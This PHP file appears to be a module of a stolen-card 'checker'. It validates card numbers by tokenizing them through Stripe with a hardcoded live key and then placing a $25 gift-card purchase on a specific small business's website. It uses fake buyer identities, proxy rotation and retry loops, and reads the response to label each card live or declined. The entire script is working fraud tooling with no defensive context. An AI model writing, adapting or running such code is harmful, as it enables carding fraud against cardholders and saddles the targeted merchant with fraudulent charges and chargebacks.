<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78ef418&time_on_page='.rand(50000, 100000).'&key=pk_live_E1xTa4DSmCMrENqYEbm6aHGs0041kQFPiB';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://jamesvalleylandscape.com/gift-cards/', null, null, $server['proxy']);

if (!$r2->success) goto start;

$bID = trim(strip_tags($this->getstr($r2->body, "'bID':", "'")));

$cID = trim(strip_tags($this->getstr($r2->body, "'cID':", "'")));

$ccm_token = trim(strip_tags($this->getstr($r2->body, "'ccm_token': '", "'")));

if (empty($bID) || empty($cID) || empty($ccm_token)) {
	$empty = 'Second Request Tokens are Empty';

	goto start;
}

$data = 'card_1_amount=25&card_1_quantity=1&card_1_to=&card_1_from=&card_1_message=&card_2_amount=0&card_2_quantity=0&card_2_to=&card_2_from=&card_2_message=&card_3_amount=0&card_3_quantity=0&card_3_to=&card_3_from=&card_3_message=&card_4_amount=0&card_4_quantity=0&card_4_to=&card_4_from=&card_4_message=&card_5_amount=0&card_5_quantity=0&card_5_to=&card_5_from=&card_5_message=&first_name='.$fake->first.'&last_name='.$fake->last.'&email='.urlencode($fake->email).'&phone=2564567654&shipping_to=Me&shipping_first_name=&shipping_last_name=&shipping_address_street=12+main+street&shipping_address_city=Brewster&shipping_address_state=NY&shipping_address_zip=10509&cc_number='.$cc.'&cc_expires='.$mm.'+%2F+'.$yy.'&cc_cvc='.$cvv.'&stripe_token='.$tok.'&frontend_calulated_dollars_total=25&honeypot1=&honeypot2=7&bID='.$bID.'&cID='.$cID.'&ccm_token='.urlencode($ccm_token).'';

$r3 = $this->curlx->Post('https://jamesvalleylandscape.com/tools/packages/wc_payment_form/ajax_submit', $data, null, null, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

$err = implode($json_r3->errors ?? []);

$err = trim(str_replace(', or it is not the correct number', '', $err));

$status = $this->response->Stripe($r3->body, $err);

end: